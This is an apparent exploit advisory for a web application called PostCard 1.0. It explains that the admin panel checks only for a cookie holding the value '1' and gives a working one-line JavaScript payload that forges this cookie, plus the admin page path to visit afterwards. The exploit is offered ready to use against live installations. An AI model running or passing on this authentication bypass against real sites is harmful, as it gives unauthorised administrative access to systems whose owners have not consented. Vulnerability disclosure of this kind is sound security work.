DESCRIPTION:
PostCard 1.0 (and prior???) suffers from insecure cookie handling.
to be able to view admin panel the user requires to login using a valid user/pass
after the valid user/pass has been passed and matches then a cookie is created
the admin panel checks to see if this cookie exists  if it does then user can access admin.

since the cookie doesnt contain no hash/pass/sid just a number "1" indicating we are logged in, the remote
attacker can craft a cookie (working example below) to access admin



Vulnerability:
javascript:document.cookie = "logged_in=1; path=/;";


NOTE/TIP:
after running the above javascript (or adding cookies manually) you will be able to visit the admin panel at
"/postcard-admin.php"
